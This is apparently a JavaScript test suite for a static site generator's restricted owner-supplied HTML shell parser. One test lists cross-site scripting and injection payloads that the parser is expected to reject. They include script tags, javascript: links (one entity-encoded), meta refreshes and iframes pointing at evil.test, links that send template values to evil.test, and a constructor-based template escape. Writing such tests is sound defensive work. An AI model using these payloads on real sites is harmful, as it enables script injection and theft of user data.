import assert from 'node:assert/strict';
import {readFileSync} from 'node:fs';
import {parseHtmlShell,htmlShellAssets,shellText} from '../app/modules/staticSiteGenerator/site/htmlShell.js';
import {normalizeSitePresentation} from '../app/modules/staticSiteGenerator/site/presentation.js';

const example=readFileSync(new URL('../examples/creator-shell.html',import.meta.url),'utf8');
const cid='bafkreihai2kno6iph4yweurfqc7owuunxc5p43kntfv2dqctkukbfntlhy';
const manifest=(html=example)=>({schemaVersion:1,template:{id:'html-shell',version:1,html}});
describe('restricted owner HTML shells',()=>{
    it('roundtrips editable source and derives only checked data nodes',()=>{
        parseHtmlShell(example.replace(/\n/g,'\r\n'));
        const canonical=normalizeSitePresentation(manifest());
        assert.equal(canonical.template.id,'html-shell');
        assert.deepEqual(normalizeSitePresentation(canonical),canonical);
        assert.equal(parseHtmlShell(example).filter(n=>'tag' in n).length,3);
        assert.equal(shellText('{{site.title}} {{site.description}}',{title:'<script>x</script>',description:'{{site.title}}'}),'<script>x</script> {{site.title}}');
        const html=example+`<p title="{{site.title}}"><strong>Welcome</strong> {{site.description}} <a href="https://example.com">Elsewhere</a><img src="/ipfs/${cid}/image.webp" alt="Artwork"></p>`;
        assert.deepEqual(htmlShellAssets(html),[`/ipfs/${cid}/image.webp`]);
        parseHtmlShell(example+'<img src="{{site.avatarUrl}}" alt="{{site.title}}">');
    });
    it('rejects active HTML, browser repairs, CSS and Vue/template execution contexts',()=>{
        for (const attack of [
            '<html></html>','<head></head>','<body></body>','<!doctype html>','</div>','<div>x</ignored>y</div>',
            '<script>alert(1)</script>','<style>body{display:none}</style>','<iframe src="https://evil.test"></iframe>',
            '<svg><script>alert(1)</script></svg>','<math><mtext>x</mtext></math>','<form><input></form>',
            '<base href="https://evil.test">','<meta http-equiv="refresh" content="0;url=https://evil.test">',
            '<div onclick="alert(1)"></div>','<div v-html="secret"></div>','<div :class="x"></div>',
            '<div style="position:fixed"></div>','<div class="membership-modal"></div>',
            '<div id="membership-google"></div>','<div data-testid="join-membership"></div>',
            '<p><div>browser repair</div></p>','<div>unclosed','<!-- hidden -->','<table><tr><td>x</td></tr></table>',
            '<a href="javascript:alert(1)">x</a>','<a href="&#106;avascript:alert(1)">x</a>',
            '<a href="https://evil.test/?secret={{post.url}}">x</a>',
            '<a href="https://evil.test/?secret={{site.title}}">x</a>',
            '<img src="https://tracker.test/a" alt="x">','<img src="/ipfs/not-a-cid" alt="x">',
            `<img src="/ipfs/${cid}/../x" alt="x">`,'<img src="{{post.url}}" alt="x">',
            '<p>{{constructor.constructor("return process")()}}</p>',
            '<div class="panel" class="row"></div>','<section/>',
        ]) {
            assert.throws(()=>normalizeSitePresentation(manifest(example+attack)),/site_presentation_invalid/,attack);
        }
    });
    it('requires unique system slots and bounded legal structure',()=>{
        const slot='<geesome-slot name="posts"></geesome-slot>';
        for (const html of [
            example.replace(slot,''),example+slot,example.replace(slot,`<p>${slot}</p>`),
            example.replace(slot,`<a href="https://example.com">${slot}</a>`),
            example.replace(slot,'<geesome-slot name="secret"></geesome-slot>'),
            example.replace(slot,'<geesome-slot name="posts">fallback</geesome-slot>'),
            '<div>'.repeat(25)+example+'</div>'.repeat(25),example+'<br>'.repeat(512),
            example+'x'.repeat(32768),example+'\u0000',example+'{{site.description}}'.repeat(33),
        ]) {
            assert.throws(()=>parseHtmlShell(html),/site_presentation_invalid/);
        }
        assert.throws(()=>normalizeSitePresentation({schemaVersion:1,template:{id:'creator',version:1,html:example}}));
    });
});
